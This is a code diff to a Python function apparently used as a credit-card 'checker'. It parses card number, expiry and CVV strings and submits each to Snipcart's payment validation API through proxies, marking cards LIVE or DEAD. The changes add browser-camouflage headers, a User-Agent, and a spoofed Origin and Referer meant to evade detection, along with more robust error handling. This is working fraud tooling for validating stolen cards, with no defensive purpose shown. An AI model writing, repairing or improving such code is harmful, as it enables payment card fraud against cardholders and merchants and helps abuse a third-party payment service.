@@ -30,18 +30,43 @@ def check_gate_pro(cc):
         partes = cc.split('|')
         if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
         num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
-        auth_str = base64.b64encode(f"{SNIPCART_SECRET}:".encode()).decode()
-        headers = {"Authorization": f"Basic {auth_str}", "Content-Type": "application/json"}
-        payload = {"paymentMethod": "CreditCard", "card": {"number": num, "expiryMonth": int(mes), "expiryYear": int(ano), "cvv": cvv}}
-        response = requests.post('https://app.snipcart.com/api/paymentmethods/validate', json=payload, headers=headers, proxies=PROXIES_CONFIG, timeout=15)
+        
+        # Autenticación Pro
+        auth_bytes = f"{SNIPCART_SECRET}:".encode('ascii')
+        auth_base64 = base64.b64encode(auth_bytes).decode('ascii')
+        
+        # ESTO ES LO QUE TE FALTA: CAMUFLAJE DE NAVEGADOR
+        headers = {
+            "Authorization": f"Basic {auth_base64}",
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "Origin": "https://quickmoney-checker.com",
+            "Referer": "https://quickmoney-checker.com/"
+        }
+        
+        payload = {
+            "paymentMethod": "CreditCard",
+            "card": {"number": num, "expiryMonth": int(mes), "expiryYear": int(ano), "cvv": cvv}
+        }
+        
+        # Petición Real con Proxies Decodo
+        response = requests.post(
+            'https://app.snipcart.com/api/paymentmethods/validate', 
+            json=payload, headers=headers, proxies=PROXIES_CONFIG, timeout=15
+        )
+        
         if response.status_code == 200:
             return {"status": "LIVE", "msg": "AUTHORIZED"}
         else:
-            msg = response.json().get('message', 'DECLINED').upper()
+            try:
+                msg = response.json().get('message', 'DECLINED').upper()
+            except:
+                msg = f"ERROR {response.status_code}"
             return {"status": "DEAD", "msg": msg}
-    except:
-        return {"status": "DEAD", "msg": "GATE REJECTED"}
-
+            
+    except Exception as e:
+        return {"status": "DEAD", "msg": "CONNECTION ERROR"}
 CSS = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
